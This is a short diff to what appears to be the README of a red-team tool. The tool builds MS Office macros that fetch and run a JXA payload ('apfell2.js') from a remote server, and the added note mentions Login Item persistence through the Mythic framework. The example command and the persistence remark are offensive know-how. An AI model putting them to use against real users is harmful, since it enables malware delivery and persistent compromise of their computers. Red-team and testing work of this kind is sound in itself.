@@ -19,6 +19,8 @@ _*example: python3 jxa-macro.py -u http://192.168.1.1:8000/apfell2.js*_
 
 5. Copy and paste that macro into an MS Office doc.
 
+---------
 
+**Note: This will launch the JXA payload inside of the App Sandbox. However, Mythic does have the ability to add Login Item persistence even from the App Sandbox.
 
 
